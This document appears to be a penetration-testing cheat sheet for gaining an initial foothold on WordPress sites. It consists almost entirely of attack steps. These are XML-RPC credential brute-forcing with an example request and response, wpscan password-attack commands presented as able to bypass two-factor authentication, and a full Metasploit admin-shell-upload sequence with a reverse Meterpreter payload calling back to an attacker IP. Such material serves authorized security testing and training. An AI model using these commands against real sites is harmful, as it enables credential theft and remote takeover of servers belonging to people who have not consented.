# Initial Foothold

## Brute Force

### Manual

The following method names that is used for bruteforcing credentials.

```
wp.getUsersBlogs
metaWeblog.getUsersBlogs
wp.getCategories
```

When you intercept it in a proxy. This is what it looks like to send it in a request.

```xml
<methodCall>
	<methodName>wp.getUsersBlogs</methodName>
	<params>
		<param><value>admin</value></param>
		<param><value>password</value></param>
	</params>
</methodCall>
```

It'll respond in a error message if the credentials are invalid.

```xml
<methodResponse>
	<fault>
		<value>
			<struct>
				<member>
					<name>faultCode</name>
					<value><int>403</int></value>
				</member>
				<member>
					<name>faultString</name>
					<value><string>Incorrect username or password.</string></value>
				</member>
			</struct>
		</value>
	</fault>
</methodResponse>
```

### Scanner

```
$ wpscan --password-attack wp-login
```

If XML-RPC is enabled this can bypass multi-factor authentication (i.e. 2FA).

```
$ wpscan --password-attack xmlrpc

$ wpscan --password-attack xmlrpc-multicall
```

## Upload Payload

### Metasploit

```
msf > use exploit/unix/webapp/wp_admin_shell_upload

msf exploit(unix/webapp/wp_admin_shell_upload) > set payload php/meterpreter/reverse_tcp

msf exploit(unix/webapp/wp_admin_shell_upload) > set rhosts <target_IP>

msf exploit(unix/webapp/wp_admin_shell_upload) > set rport <target_PORT>

msf exploit(unix/webapp/wp_admin_shell_upload) > set targeturi /path/to/uri

msf exploit(unix/webapp/wp_admin_shell_upload) > set lhost <attacker_IP>

msf exploit(unix/webapp/wp_admin_shell_upload) > set lport <attacker_port>

msf exploit(unix/webapp/wp_admin_shell_upload) > run
```